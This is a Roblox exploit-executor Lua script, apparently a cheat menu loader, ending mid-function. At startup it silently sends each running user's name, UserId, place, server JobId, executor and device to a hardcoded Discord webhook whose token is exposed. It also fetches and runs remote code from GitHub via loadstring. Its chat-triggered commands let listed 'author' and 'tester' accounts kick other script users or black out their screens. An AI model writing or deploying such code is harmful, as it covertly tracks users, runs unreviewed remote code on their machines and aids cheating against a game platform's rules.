-- 款脚本客户端黑名单管理
-- 名单保存在添加者自己的执行器本地；不会自动同步到其他玩家设备。
local SCRIPT_BLACKLIST = {}
local BLACKLIST_FILE = "KuanScript/blacklist.txt"
local blacklistPlayers = game:GetService("Players")
local blacklistLocalPlayer = blacklistPlayers.LocalPlayer

local function loadScriptBlacklist()
    pcall(function()
        if isfile and readfile and isfile(BLACKLIST_FILE) then
            local data = readfile(BLACKLIST_FILE)
            for line in tostring(data):gmatch("[^\r\n]+") do
                local name = line:gsub("^%s+", ""):gsub("%s+$", "")
                if name ~= "" then table.insert(SCRIPT_BLACKLIST, name) end
            end
        end
    end)
end

local function saveScriptBlacklist()
    if not writefile then return false end
    local ok = pcall(function()
        if isfolder and makefolder and not isfolder("KuanScript") then makefolder("KuanScript") end
        writefile(BLACKLIST_FILE, table.concat(SCRIPT_BLACKLIST, "\n"))
    end)
    return ok
end

local function isScriptBlacklisted(name)
    local wanted = string.lower(tostring(name or ""))
    for _, blockedName in ipairs(SCRIPT_BLACKLIST) do
        if string.lower(blockedName) == wanted then return true end
    end
    return false
end

loadScriptBlacklist()
if isScriptBlacklisted(blacklistLocalPlayer.Name) then
    blacklistLocalPlayer:Kick("你已被加入款脚本黑名单，脚本已停止运行。")
    return
end

local function KuanMonitor()
    if _G.KuanMonitorEnabled == false then return end
    pcall(function()
        local _Players = game:GetService("Players")
        local _Http    = game:GetService("HttpService")
        local _UIS     = game:GetService("UserInputService")
        local _LP      = _Players.LocalPlayer
        local request  = http_request or request or HttpPost or syn.request
        if not request then return end
        local WEBHOOK = "https://discord.com/api/webhooks/1567178390375501989/uYaKB2n9VpPjhgdBgq5xQ24pY0_QyvsejQ1CDQwkMXPQ1XdWv6PgdSrpjeXY-bw4cFXa"
        local function safe(fn, fallback) local ok, v = pcall(fn) if ok and v ~= nil then return v end return fallback end
        local device = "未知设备"
        if _UIS.TouchEnabled and not _UIS.KeyboardEnabled and not _UIS.MouseEnabled then device = "移动设备"
        elseif not _UIS.TouchEnabled and _UIS.KeyboardEnabled and _UIS.MouseEnabled then device = "电脑"
        elseif _UIS.TouchEnabled and _UIS.KeyboardEnabled and _UIS.MouseEnabled then device = "带触摸屏的电脑" end
        local executor = safe(function() return identifyexecutor and identifyexecutor() or nil end, nil) or "未知"
        local userId = _LP.UserId
        local displayName = _LP.DisplayName or _LP.Name
        local avatarImage = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
        local accountAge = safe(function() return _LP.AccountAge .. " 天" end, "未知")
        local placeName = safe(function() return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end, "未知地图")
        local timeStr = os.date("%Y-%m-%d %H:%M:%S")
        local msg = {
            ["username"] = "款脚本记录",
            ["embeds"] = {{
                ["color"] = 0x32CD32,
                ["title"] = "正式版款脚本监控-有人正在使用 " .. os.date("%H") .. "时" .. os.date("%M") .. "分",
                ["thumbnail"] = { ["url"] = avatarImage },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                ["fields"] = {
                    { ["name"] = "用户名", ["value"] = tostring(_LP.Name), ["inline"] = true },
                    { ["name"] = "名称", ["value"] = tostring(displayName), ["inline"] = true },
                    { ["name"] = "UserId", ["value"] = tostring(userId), ["inline"] = true },
                    { ["name"] = "地图名称", ["value"] = tostring(placeName), ["inline"] = true },
                    { ["name"] = "PlaceId", ["value"] = tostring(game.PlaceId), ["inline"] = true },
                    { ["name"] = "JobId", ["value"] = tostring(game.JobId), ["inline"] = true },
                    { ["name"] = "使用的注入器", ["value"] = tostring(executor), ["inline"] = true },
                    { ["name"] = "账号年龄", ["value"] = tostring(accountAge), ["inline"] = true },
                    { ["name"] = "设备", ["value"] = tostring(device), ["inline"] = true },
                },
                ["footer"] = { ["text"] = "款脚本 · " .. timeStr }
            }}
        }
        request({ Url = WEBHOOK, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = _Http:JSONEncode(msg) })
    end)
end
task.spawn(KuanMonitor)

_G.KuanClickFxEnabled = _G.KuanClickFxEnabled ~= false
_G.KuanStartSoundEnabled = _G.KuanStartSoundEnabled ~= false

local Players          = game:GetService("Players")
local RunService       = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Lighting         = game:GetService("Lighting")
local TextChatService  = game:GetService("TextChatService")
local TweenService     = game:GetService("TweenService")
local LocalPlayer      = Players.LocalPlayer
local SoundService     = game:GetService("SoundService")
local Workspace        = game:GetService("Workspace")
local ReplicatedStorage= game:GetService("ReplicatedStorage")

local FLASH_PLACE_ID = 136801880565837
local SA_PLACE_ID    = 103854444055060
local isFlash = game.PlaceId == FLASH_PLACE_ID
local isSA    = game.PlaceId == SA_PLACE_ID

if not isFlash and not isSA then
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/fgyhxrtm-ship-it/gghv/refs/heads/main/%E6%AC%BE%E8%84%9A%E6%9C%AC%E9%80%9A%E7%94%A8%E5%8A%A0%E5%AF%86.lua"))()
    end)
    return
end

local success, library = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/fgyhxrtm-ship-it/gghv/refs/heads/main/%E6%96%B0UI.lua"))()
end)
if not success or type(library) ~= "table" or type(library.CreateWindow) ~= "function" then
    warn("[款脚本] UI 库加载失败或 CreateWindow 接口不存在；请检查新UI.lua 是否可访问、是否更新。")
    return
end

local START_SOUND_ID = "17687850030"
local CLICK_IMAGE_ID = "87451785636482"

local function PlayStartSound()
    if _G.KuanStartSoundEnabled == false then return end
    pcall(function()
        local s = Instance.new("Sound")
        s.SoundId = "rbxassetid://" .. START_SOUND_ID
        s.Volume = 0.5
        s.Parent = SoundService
        s:Play()
        task.delay(2, function() if s then s:Destroy() end end)
    end)
end

UserInputService.InputBegan:Connect(function(input)
    if _G.KuanClickFxEnabled == false then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        local pg = LocalPlayer:WaitForChild("PlayerGui")
        local screen = pg:FindFirstChild("ClickPointGui")
        if not screen then
            screen = Instance.new("ScreenGui")
            screen.Name = "ClickPointGui"
            screen.ResetOnSpawn = false
            screen.IgnoreGuiInset = true
            screen.DisplayOrder = 10000
            screen.Enabled = true
            screen.Parent = pg
        end
        local point = Instance.new("ImageLabel")
        -- 点击特效只负责显示，不参与命中测试，避免挡住下方按钮/下拉选项
        point.Active = false
        point.Selectable = false
        point.Size = UDim2.new(0, 30, 0, 30)
        point.AnchorPoint = Vector2.new(0.5, 0.5)
        point.Position = UDim2.new(0, input.Position.X, 0, input.Position.Y)
        point.BackgroundTransparency = 1
        point.Image = "rbxassetid://" .. CLICK_IMAGE_ID
        point.Parent = screen
        Instance.new("UICorner", point).CornerRadius = UDim.new(1, 0)
        TweenService:Create(point, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            Size = UDim2.new(0, 60, 0, 60), ImageTransparency = 1
        }):Play()
        task.delay(0.6, function() point:Destroy() end)
    end
end)

local ScriptUsers = { [LocalPlayer.Name] = true }
_G.KuanScriptUsers = ScriptUsers
_G.KuanRefreshTags = nil

local ADMIN_LIST   = { "huwen97", "KuaishouKuan2", "XHZY_SHZYZJ", "mj_676711451467", "thmost1", "WUyangXxX", "sysy78NB", "aa1360051" }
local TESTER_LIST  = { "ctyccttvyvv", "Noobplayer4523XD", "wR1P84" }
local AUTHOR_LIST  = { "fuhgtdtfftxrvfhf", "dhjhcxgjk" }

local function inList(list, name)
    local lowerName = string.lower(name)
    for _, v in ipairs(list) do
        if string.lower(v) == lowerName then return true end
    end
    return false
end

local function getRank(name)
    if inList(AUTHOR_LIST, name) then return 3 end
    if inList(TESTER_LIST, name) then return 2 end
    if inList(ADMIN_LIST,  name) then return 1 end
    return 0
end

local function isAdmin(name)  return getRank(name) >= 1 end
local function isTester(name) return getRank(name) == 2 end
local function isAuthor(name) return getRank(name) == 3 end
local function isInAnyList(name) return getRank(name) >= 1 end

local selfRole
if isAuthor(LocalPlayer.Name) then
    selfRole = "款脚本作者"
elseif isTester(LocalPlayer.Name) then
    selfRole = "测试官"
elseif isAdmin(LocalPlayer.Name) then
    selfRole = "测试人员"
else
    selfRole = "款脚本用户"
end
local activeTags = {}
local showHeadTagEnabled = true
local showOtherTagsEnabled = false
local allowLowRankTagsEnabled = false
local restrictLowRankTagEffects = false -- 仅限制本地看到的低等级头衔特效
local tagBackgroundEnabled = false -- 默认关闭头衔背景图片
local tagShimmerEnabled = true
local tagVerticalShakeEnabled = false
local tagHorizontalShakeEnabled = false

-- 纯客户端只能读取游戏服务器已复制给客户端的标记。
-- 只有服务器明确将目标玩家标记为 KuanScriptActive=true，才视为已启动款脚本。
-- 同时要求目标等级严格低于本地玩家；未标记、同级或更高级玩家均不显示。
local function canSeeTag(myPlayer, targetPlayer)
    if not myPlayer or not targetPlayer then return false end
    if targetPlayer == myPlayer then return true end
    if not showOtherTagsEnabled then return false end
    if getRank(myPlayer.Name) < 1 then return false end
    if getRank(targetPlayer.Name) >= getRank(myPlayer.Name) then return false end

    local activeOk, isScriptActive = pcall(function()
        return targetPlayer:GetAttribute("KuanScriptActive")
    end)
    if not activeOk or isScriptActive ~= true then return false end

    return true
end

local function createTag(player)
    if not showHeadTagEnabled then return end
    if not player or not player.Character then return end
    if not canSeeTag(LocalPlayer, player) then return end
    if activeTags[player] then return end
    local head = player.Character:FindFirstChild("Head")
    if not head then return end

    local rank = getRank(player.Name)
    local mainTitle = "款脚本用户"
    if rank == 3 then mainTitle = "款脚本作者"
    elseif rank == 2 then mainTitle = "测试官"
    elseif rank == 1 then mainTitle = "测试人员" end

    local billboard = Instance.new("BillboardGui")
    billboard.Name = "KuanAuthorTag"
    billboard.Size = UDim2.new(0, 185, 0, 52)
    billboard.StudsOffset = Vector3.new(0, 1.4, 0)
    billboard.AlwaysOnTop = true
    billboard.Parent = head

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(10, 5, 16)
    bg.BackgroundTransparency = 0
    bg.BorderSizePixel = 0
    bg.Parent = billboard
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = bg

    -- 头衔框专用背景图：只限制在原有 185x52 头衔框内，不覆盖主界面
    local tagBackgroundImage = Instance.new("ImageLabel")
    tagBackgroundImage.Name = "TagBackgroundImage"
    tagBackgroundImage.Size = UDim2.new(1, 0, 1, 0)
    tagBackgroundImage.Position = UDim2.new(0, 0, 0, 0)
    tagBackgroundImage.BackgroundTransparency = 1
    tagBackgroundImage.BorderSizePixel = 0
    tagBackgroundImage.Image = "rbxassetid://76786845799745"
    tagBackgroundImage.ImageTransparency = 0.10
    tagBackgroundImage.ScaleType = Enum.ScaleType.Crop
    tagBackgroundImage.Visible = tagBackgroundEnabled
    tagBackgroundImage.ZIndex = 1
    tagBackgroundImage.Parent = bg
    local tagBackgroundCorner = Instance.new("UICorner")
    tagBackgroundCorner.CornerRadius = UDim.new(0, 10)
    tagBackgroundCorner.Parent = tagBackgroundImage

    -- 按目标玩家身份分配专属头衔配色
    -- 作者：青蓝-紫色渐变；测试官：紫色；测试人员：青色；普通脚本用户：白色
    local gradStart, gradEnd
    if rank == 3 then
        gradStart = Color3.fromRGB(0, 220, 255)
        gradEnd   = Color3.fromRGB(200, 0, 255)
    elseif rank == 2 then
        gradStart = Color3.fromRGB(190, 100, 255)
        gradEnd   = Color3.fromRGB(105, 35, 210)
    elseif rank == 1 then
        gradStart = Color3.fromRGB(0, 220, 255)
        gradEnd   = Color3.fromRGB(0, 145, 210)
    else
        gradStart = Color3.fromRGB(255, 255, 255)
        gradEnd   = Color3.fromRGB(220, 225, 235)
    end

    local strokeOuter = Instance.new("UIStroke")
    strokeOuter.Color = Color3.fromRGB(255, 255, 255)
    strokeOuter.Thickness = 2.5
    strokeOuter.Transparency = 0
    strokeOuter.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    strokeOuter.Parent = bg
    local strokeOuterGrad = Instance.new("UIGradient")
    strokeOuterGrad.Color = ColorSequence.new(gradStart, gradEnd)
    strokeOuterGrad.Rotation = 45
    strokeOuterGrad.Parent = strokeOuter

    local innerBorder = Instance.new("Frame")
    innerBorder.Size = UDim2.new(1, -4, 1, -4)
    innerBorder.Position = UDim2.new(0, 2, 0, 2)
    innerBorder.BackgroundTransparency = 1
    innerBorder.BorderSizePixel = 0
    innerBorder.Parent = bg
    local innerCorner = Instance.new("UICorner")
    innerCorner.CornerRadius = UDim.new(0, 8)
    innerCorner.Parent = innerBorder

    local strokeInner = Instance.new("UIStroke")
    strokeInner.Color = Color3.fromRGB(255, 255, 255)
    strokeInner.Thickness = 1
    strokeInner.Transparency = 0.2
    strokeInner.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    strokeInner.Parent = innerBorder
    local strokeInnerGrad = Instance.new("UIGradient")
    strokeInnerGrad.Color = ColorSequence.new(gradStart, gradEnd)
    strokeInnerGrad.Rotation = -45
    strokeInnerGrad.Parent = strokeInner

    local sideBar = Instance.new("Frame")
    sideBar.Size = UDim2.new(0, 2, 1, -16)
    sideBar.Position = UDim2.new(0, 6, 0, 8)
    sideBar.BorderSizePixel = 0
    sideBar.Parent = bg
    local sideBarCorner = Instance.new("UICorner")
    sideBarCorner.CornerRadius = UDim.new(1, 0)
    sideBarCorner.Parent = sideBar
    local sideBarGrad = Instance.new("UIGradient")
    sideBarGrad.Color = ColorSequence.new(gradStart, gradEnd)
    sideBarGrad.Rotation = 90
    sideBarGrad.Parent = sideBar

    local avatarHolder = Instance.new("Frame")
    avatarHolder.Size = UDim2.new(0, 34, 0, 34)
    avatarHolder.Position = UDim2.new(0, 12, 0.5, -17)
    avatarHolder.BackgroundTransparency = 1
    avatarHolder.ZIndex = 3
    avatarHolder.Parent = bg

    local avatar = Instance.new("ImageLabel")
    avatar.Size = UDim2.new(1, 0, 1, 0)
    avatar.BackgroundColor3 = Color3.fromRGB(20, 15, 30)
    avatar.BorderSizePixel = 0
    avatar.ZIndex = 3
    avatar.Image = "rbxthumb://type=AvatarHeadShot&id=" .. tostring(player.UserId) .. "&w=100&h=100"
    avatar.Parent = avatarHolder
    -- 通过 Roblox 缩略图 API 再取一次头像，避免 rbxthumb 地址未及时解析时头像空白。
    task.spawn(function()
        local thumbOk, thumbUrl = pcall(function()
            local content, _isReady = Players:GetUserThumbnailAsync(
                player.UserId,
                Enum.ThumbnailType.HeadShot,
                Enum.ThumbnailSize.Size100x100
            )
            return content
        end)
        if thumbOk and thumbUrl and avatar and avatar.Parent then
            avatar.Image = thumbUrl
        end
    end)
    local avatarCorner = Instance.new("UICorner")
    avatarCorner.CornerRadius = UDim.new(1, 0)
    avatarCorner.Parent = avatar

    local avatarStroke = Instance.new("UIStroke")
    avatarStroke.Color = Color3.fromRGB(255, 255, 255)
    avatarStroke.Thickness = 2
    avatarStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    avatarStroke.Parent = avatar
    local avatarStrokeGrad = Instance.new("UIGradient")
    avatarStrokeGrad.Color = ColorSequence.new(gradStart, gradEnd)
    avatarStrokeGrad.Rotation = 45
    avatarStrokeGrad.Parent = avatarStroke

    local textContainer = Instance.new("Frame")
    textContainer.Size = UDim2.new(1, -60, 1, 0)
    textContainer.Position = UDim2.new(0, 56, 0, 0)
    textContainer.BackgroundTransparency = 1
    textContainer.ZIndex = 3
    textContainer.Parent = bg

    local roleText = Instance.new("TextLabel")
    roleText.Size = UDim2.new(1, 0, 0, 12)
    roleText.Position = UDim2.new(0, 0, 0, 6)
    roleText.BackgroundTransparency = 1
    roleText.ZIndex = 3
    roleText.Text = "KUAN SCRIPT USER"
    roleText.TextColor3 = gradStart
    roleText.TextSize = 8
    roleText.Font = Enum.Font.GothamBold
    roleText.TextXAlignment = Enum.TextXAlignment.Left
    roleText.Parent = textContainer

    local mainTitleText = Instance.new("TextLabel")
    mainTitleText.Size = UDim2.new(1, 0, 0, 18)
    mainTitleText.Position = UDim2.new(0, 0, 0, 17)
    mainTitleText.BackgroundTransparency = 1
    mainTitleText.ZIndex = 3
    mainTitleText.Text = mainTitle
    mainTitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
    mainTitleText.TextSize = 13
    mainTitleText.Font = Enum.Font.GothamBold
    mainTitleText.TextXAlignment = Enum.TextXAlignment.Left
    mainTitleText.Parent = textContainer

    local subText = Instance.new("TextLabel")
    subText.Size = UDim2.new(1, 0, 0, 12)
    subText.Position = UDim2.new(0, 0, 1, -14)
    subText.BackgroundTransparency = 1
    subText.ZIndex = 3
    subText.Text = player.Name .. "  ONLINE"
    subText.TextColor3 = Color3.fromRGB(180, 160, 220)
    subText.TextSize = 9
    subText.Font = Enum.Font.GothamMedium
    subText.TextXAlignment = Enum.TextXAlignment.Left
    subText.Parent = textContainer

    local dotHolder = Instance.new("Frame")
    dotHolder.Size = UDim2.new(0, 16, 0, 16)
    dotHolder.Position = UDim2.new(1, -24, 0.5, -8)
    dotHolder.BackgroundTransparency = 1
    dotHolder.ZIndex = 3
    dotHolder.Parent = bg

    local dotOuter = Instance.new("Frame")
    dotOuter.Size = UDim2.new(1, 0, 1, 0)
    dotOuter.BackgroundTransparency = 1
    dotOuter.Parent = dotHolder
    local dotOuterCorner = Instance.new("UICorner")
    dotOuterCorner.CornerRadius = UDim.new(1, 0)
    dotOuterCorner.Parent = dotOuter

    local dotOuterStroke = Instance.new("UIStroke")
    dotOuterStroke.Color = Color3.fromRGB(255, 255, 255)
    dotOuterStroke.Thickness = 1
    dotOuterStroke.Transparency = 0.3
    dotOuterStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    dotOuterStroke.Parent = dotOuter
    local dotOuterGrad = Instance.new("UIGradient")
    dotOuterGrad.Color = ColorSequence.new(gradStart, gradEnd)
    dotOuterGrad.Parent = dotOuterStroke

    local dotInner = Instance.new("Frame")
    dotInner.Size = UDim2.new(0, 6, 0, 6)
    dotInner.Position = UDim2.new(0.5, -3, 0.5, -3)
    dotInner.BorderSizePixel = 0
    dotInner.Parent = dotHolder
    local dotInnerCorner = Instance.new("UICorner")
    dotInnerCorner.CornerRadius = UDim.new(1, 0)
    dotInnerCorner.Parent = dotInner
    local dotInnerGrad = Instance.new("UIGradient")
    dotInnerGrad.Color = ColorSequence.new(gradStart, gradEnd)
    dotInnerGrad.Parent = dotInner

    local baseTagOffset = Vector3.new(0, 1.4, 0)
    local tagPhase = math.random() * math.pi * 2
    local rotConnection
    rotConnection = RunService.RenderStepped:Connect(function()
        if not billboard.Parent then
            rotConnection:Disconnect()
            return
        end
        local lowRankEffectsBlocked = restrictLowRankTagEffects and rank == 0
        if tagShimmerEnabled and rank == 3 and not lowRankEffectsBlocked then
            strokeOuterGrad.Rotation = (strokeOuterGrad.Rotation + 1) % 360
            strokeInnerGrad.Rotation = (strokeInnerGrad.Rotation - 1) % 360
            avatarStrokeGrad.Rotation = (avatarStrokeGrad.Rotation + 1) % 360
        end
        local t = tick() * 2 + tagPhase
        local dx = (tagHorizontalShakeEnabled and not lowRankEffectsBlocked) and math.cos(t) * 0.045 or 0
        local dy = (tagVerticalShakeEnabled and not lowRankEffectsBlocked) and math.sin(t) * 0.045 or 0
        billboard.StudsOffset = baseTagOffset + Vector3.new(dx, dy, 0)
    end)

    task.spawn(function()
        while activeTags[player] and dotInner.Parent do
            TweenService:Create(dotInner, TweenInfo.new(1.2), {BackgroundTransparency = 0.8}):Play()
            task.wait(1.2)
            TweenService:Create(dotInner, TweenInfo.new(1.2), {BackgroundTransparency = 0}):Play()
            task.wait(1.2)
        end
    end)

    activeTags[player] = billboard
end

local function clearTag(player)
    if activeTags[player] then activeTags[player]:Destroy() activeTags[player] = nil end
end

local function refreshAllTags()
    for player in pairs(activeTags) do clearTag(player) end
    for _, player in ipairs(Players:GetPlayers()) do
        createTag(player)
    end
end
_G.KuanRefreshTags = refreshAllTags

-- 高等级管理成员加入时，向等级低于加入者的本地玩家显示系统欢迎消息
local welcomedJoiners = {}

local function showRankWelcomeMessage(player)
    if not player or player == LocalPlayer then return end

    local joiningRank = getRank(player.Name)
    local localRank = getRank(LocalPlayer.Name)
    if joiningRank < 2 or localRank >= joiningRank then return end
    if welcomedJoiners[player.UserId] then return end
    welcomedJoiners[player.UserId] = true

    local welcomeText
    if joiningRank == 3 then
        welcomeText = "欢迎款脚本作者加入游戏！"
    elseif joiningRank == 2 then
        welcomeText = "欢迎测试官加入游戏！"
    else
        return
    end

    task.spawn(function()
        -- 优先在聊天窗口显示系统消息；若当前聊天频道不可用，则退回系统通知。
        local displayed = false
        for _ = 1, 8 do
            local ok = pcall(function()
                local channels = TextChatService:FindFirstChild("TextChannels")
                local generalChannel = channels and channels:FindFirstChild("RBXGeneral")
                if generalChannel then
                    generalChannel:DisplaySystemMessage(welcomeText)
                    displayed = true
                end
            end)
            if displayed then break end
            task.wait(0.5)
        end

        if not displayed then
            pcall(function()
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "系统消息",
                    Text = welcomeText,
                    Duration = 5
                })
            end)
        end
    end)
end

local function onPlayerJoin(player)
    showRankWelcomeMessage(player)

    task.spawn(function()
        local char = player.Character or player.CharacterAdded:Wait()
        local head = char:WaitForChild("Head", 5)
        if head then
            task.wait(0.1)
            createTag(player)
        end
    end)
    player.CharacterAdded:Connect(function()
        clearTag(player)
        task.wait(0.5)
        createTag(player)
    end)
    player.CharacterRemoving:Connect(function() clearTag(player) end)
end

Players.PlayerAdded:Connect(onPlayerJoin)
for _, player in ipairs(Players:GetPlayers()) do task.spawn(function() onPlayerJoin(player) end) end
Players.PlayerRemoving:Connect(function(player) clearTag(player) end)
Players.PlayerRemoving:Connect(function(player) clearTag(player) end)

do
    local KickCommands = { "踢@", "踢 ", "kick ", "/kick ", "!kick ", "tk ", "t@", "@" }
    local MinMatchChars = 3
    local KickConfirmMessage = "好的，我马上走"
    local function CleanString(str)
        local result = ""
        for i = 1, #str do local c = str:sub(i, i) if c:match("[%w]") then result = result .. c end end
        return string.lower(result)
    end
    local function FuzzyMatch(targetStr, searchStr)
        if #searchStr < MinMatchChars then return false end
        local targetClean = CleanString(targetStr)
        local searchClean = CleanString(searchStr)
        if #searchClean < MinMatchChars then return false end
        local pos = 1
        for i = 1, #searchClean do
            local char = searchClean:sub(i, i)
            local found = targetClean:find(char, pos, true)
            if not found then return false end
            pos = found + 1
        end
        return true
    end
    local function MessageMatchesLocalPlayer(message)
        local matchedName = message
        local lowerMsg = string.lower(message)
        for _, cmd in ipairs(KickCommands) do
            if string.sub(lowerMsg, 1, #cmd) == cmd then
                matchedName = string.sub(message, #cmd + 1)
                matchedName = matchedName:gsub("^%s+", ""):gsub("%s+$", "")
                break
            end
        end
        return FuzzyMatch(LocalPlayer.Name, matchedName) or FuzzyMatch(LocalPlayer.DisplayName, matchedName)
    end
    local function SendChatMessage(msg)
        local ok = false
        pcall(function()
            if TextChatService.ChatVersion ~= Enum.ChatVersion.LegacyChatService then
                local channels = TextChatService:FindFirstChild("TextChannels")
                if channels then
                    local general = channels:FindFirstChild("RBXGeneral")
                    if general and general:IsA("TextChannel") then general:SendAsync(msg) ok = true return end
                end
            end
        end)
        if ok then return end
        pcall(function() LocalPlayer:Chat(msg) end)
    end
    local function ShowKickPopup(kickerName)
        local playerGui = LocalPlayer:WaitForChild("PlayerGui")
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "KickPopup"
        screenGui.Parent = playerGui
        screenGui.ResetOnSpawn = false
        screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        local overlay = Instance.new("Frame")
        overlay.Size = UDim2.new(1, 0, 1, 0)
        -- 全屏遮罩只显示暗色背景，不能拦截菜单、下拉框的输入
        overlay.Active = false
        overlay.Selectable = false
        overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        overlay.BackgroundTransparency = 1
        overlay.BorderSizePixel = 0
        overlay.Parent = screenGui
        TweenService:Create(overlay, TweenInfo.new(0.3, Enum.EasingStyle.Quad), { BackgroundTransparency = 0.6 }):Play()
        local popup = Instance.new("Frame")
        popup.Size = UDim2.new(0, 300, 0, 150)
        popup.Position = UDim2.new(0.5, -150, 0.4, 0)
        popup.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
        popup.BorderSizePixel = 0
        popup.Parent = screenGui
        Instance.new("UICorner", popup).CornerRadius = UDim.new(0, 10)
        local stroke = Instance.new("UIStroke")
        stroke.Thickness = 2
        stroke.Color = Color3.fromRGB(255, 70, 70)
        stroke.Parent = popup
        local title = Instance.new("TextLabel")
        title.Size = UDim2.new(1, 0, 0, 35)
        title.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
        title.BorderSizePixel = 0
        title.Font = Enum.Font.GothamBold
        title.Text = "恭喜你被踢了"
        title.TextColor3 = Color3.fromRGB(255, 255, 255)
        title.TextSize = 18
        title.Parent = popup
        Instance.new("UICorner", title).CornerRadius = UDim.new(0, 10)
        local bottomFix = Instance.new("Frame")
        bottomFix.Size = UDim2.new(1, 0, 0, 10)
        bottomFix.Position = UDim2.new(0, 0, 1, -10)
        bottomFix.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
        bottomFix.BorderSizePixel = 0
        bottomFix.Parent = title
        local content = Instance.new("TextLabel")
        content.Size = UDim2.new(1, -30, 1, -45)
        content.Position = UDim2.new(0, 15, 0, 40)
        content.BackgroundTransparency = 1
        content.Font = Enum.Font.SourceSans
        content.Text = "踢出者: " .. kickerName .. "\n\n3 秒后自动滚..."
        content.TextColor3 = Color3.fromRGB(220, 220, 220)
        content.TextSize = 14
        content.TextXAlignment = Enum.TextXAlignment.Left
        content.TextYAlignment = Enum.TextYAlignment.Top
        content.Parent = popup
    end
    local function ExecuteKick(kicker)
        SendChatMessage(KickConfirmMessage)
        ShowKickPopup(kicker.Name)
        task.wait(3)
        pcall(function() LocalPlayer:Kick("你已被测试人员/脚本作者" .. kicker.Name .. "踢出服务器") end)
    end
    local function ProcessMessage(sender, message)
        if not sender or not message or message == "" then return end
        if sender == LocalPlayer then return end
        local senderRank = getRank(sender.Name)
        local localRank = getRank(LocalPlayer.Name)
        if localRank == 0 then return end
        if senderRank >= localRank then return end
        if MessageMatchesLocalPlayer(message) then ExecuteKick(sender) end
    end
    local function hookPlayer(player)
        player.Chatted:Connect(function(msg) ProcessMessage(player, msg) end)
    end
    for _, player in ipairs(Players:GetPlayers()) do if player ~= LocalPlayer then hookPlayer(player) end end
    Players.PlayerAdded:Connect(hookPlayer)
end

-- 请求离开协议：通过 Roblox 聊天频道向目标发送请求。
-- 接收方也必须运行包含本协议的脚本；其客户端会校验请求者等级后自行退出。
local LEAVE_REQUEST_PREFIX = "[KUAN_LEAVE_REQUEST]"
pcall(function()
    TextChatService.MessageReceived:Connect(function(message)
        local source = message.TextSource
        if not source or source.UserId == LocalPlayer.UserId then return end
        local text = tostring(message.Text or "")
        if text:sub(1, #LEAVE_REQUEST_PREFIX) ~= LEAVE_REQUEST_PREFIX then return end
        local targetId, senderId = text:sub(#LEAVE_REQUEST_PREFIX + 1):match("^(%d+):(%d+)$")
        if not targetId or tonumber(targetId) ~= LocalPlayer.UserId then return end
        if tonumber(senderId) ~= source.UserId then return end
        local sender = Players:GetPlayerByUserId(source.UserId)
        if not sender then return end
        local senderRank = getRank(sender.Name)
        local myRank = getRank(LocalPlayer.Name)
        if senderRank < 2 or senderRank <= myRank then return end
        LocalPlayer:Kick("你已接受 " .. sender.Name .. " 发出的离开游戏请求。")
    end)
end)

-- 黑屏/恢复协议：只改变接收方自己的客户端画面；接收方需运行配套脚本。
local BLACKOUT_REQUEST_PREFIX = "[KUAN_BLACKOUT]"
local RESTORE_REQUEST_PREFIX = "[KUAN_RESTORE]"
local blackoutGui = nil
local function setLocalBlackout(enabled)
    local playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui") or LocalPlayer:WaitForChild("PlayerGui")
    if enabled then
        if blackoutGui and blackoutGui.Parent then return end
        blackoutGui = Instance.new("ScreenGui")
        blackoutGui.Name = "KuanScriptBlackout"
        blackoutGui.IgnoreGuiInset = true
        blackoutGui.DisplayOrder = 1000000
        blackoutGui.ResetOnSpawn = false
        local frame = Instance.new("Frame")
        frame.Name = "Blackout"
        frame.Size = UDim2.fromScale(1, 1)
        frame.Position = UDim2.fromScale(0, 0)
        frame.BackgroundColor3 = Color3.new(0, 0, 0)
        frame.BorderSizePixel = 0
        frame.Parent = blackoutGui
        blackoutGui.Parent = playerGui
    elseif blackoutGui then
        blackoutGui:Destroy()
        blackoutGui = nil
    end
end

pcall(function()
    TextChatService.MessageReceived:Connect(function(message)
        local source = message.TextSource
        if not source or source.UserId == LocalPlayer.UserId then return end
        local text = tostring(message.Text or "")
        local prefix, enabled
        if text:sub(1, #BLACKOUT_REQUEST_PREFIX) == BLACKOUT_REQUEST_PREFIX then
            prefix, enabled = BLACKOUT_REQUEST_PREFIX, true
        elseif text:sub(1, #RESTORE_REQUEST_PREFIX) == RESTORE_REQUEST_PREFIX then
            prefix, enabled = RESTORE_REQUEST_PREFIX, false
        else
            return
        end
        local targetId, senderId = text:sub(#prefix + 1):match("^(%d+):(%d+)$")
        if not targetId or tonumber(targetId) ~= LocalPlayer.UserId or tonumber(senderId) ~= source.UserId then return end
        local sender = Players:GetPlayerByUserId(source.UserId)
        if not sender then return end
        local senderRank, myRank = getRank(sender.Name), getRank(LocalPlayer.Name)
        if senderRank < 2 or senderRank <= myRank then return end
        setLocalBlackout(enabled)
    end)
end)

local function Soundify(tabObj)
    local oldSection = tabObj.Section
    if oldSection then
        tabObj.Section = function(self, cfg)
            local sec = oldSection(self, cfg)
